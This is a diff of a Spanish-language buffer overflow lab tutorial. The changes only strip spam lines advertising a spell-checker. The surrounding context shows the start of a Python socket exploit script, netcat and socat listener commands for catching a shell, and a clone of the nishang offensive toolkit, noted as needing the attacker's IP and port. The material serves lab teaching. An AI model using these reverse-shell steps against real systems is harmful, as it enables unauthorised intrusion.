@@ -308,8 +308,6 @@ Lo agregamos en padding y lo multiplicamos por un valor, uno recomendado sería 
 El script completo quedaría de la siguiente forma :
 
 
-Corregido con https://www.corrector.co/es/
-
     import socket
     
     ip = "10.10.167.216"
@@ -399,7 +397,7 @@ Lo último que faltaría hacer sería abrir un servidor ya sea con nc, socat, rl
 Les dejo ejemplos para poner en escucha varios de estos servicios por si alguno les genera algún problema:
 
 
-Corregido con https://www.corrector.co/es/
+
 
     nc -lvp [puertoDeShellCode]
     socat TCP-LISTEN:[puertoDeShellCode] stdout
@@ -417,7 +415,6 @@ Lo primero que vamos a hacer es descargar y configurar una utilidad llamada nish
 *En el caso del último comando "echo" hay que configurar la IP y el puerto del servidor del atacante por el cual se va a establecer la conexion*
 
 
-Corregido con https://www.corrector.co/es/
 
 
     sudo git clone https://github.com/samratashok/nishang
